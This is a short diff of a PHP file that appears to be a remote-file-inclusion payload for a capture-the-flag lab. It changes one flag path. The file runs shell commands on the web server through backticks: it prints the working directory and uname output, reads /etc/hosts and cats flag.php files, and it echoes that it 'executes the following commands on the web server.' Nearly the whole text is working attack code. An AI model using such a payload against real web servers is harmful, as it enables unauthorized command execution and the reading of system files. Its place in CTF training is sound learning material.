@@ -12,7 +12,7 @@
     $pwd_output = `pwd`;
     $catetchosts_output = `cat /etc/hosts`;
     $catflag1_output = `cat /var/www/html/rfi1/flag.php`;
-    $catflag2a_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
+    $catflag2a_output = `cat /var/www/html/rfi2/flag.php`;
     $catflag2_output = `cat /var/www/html/rfi2/You_Cant_Find_This_Dir/flag.php`;
     $uname_a = `uname -a`;
     ECHO "--"."><p><h4> This file executes the following commands on the web server.</h4></p>";
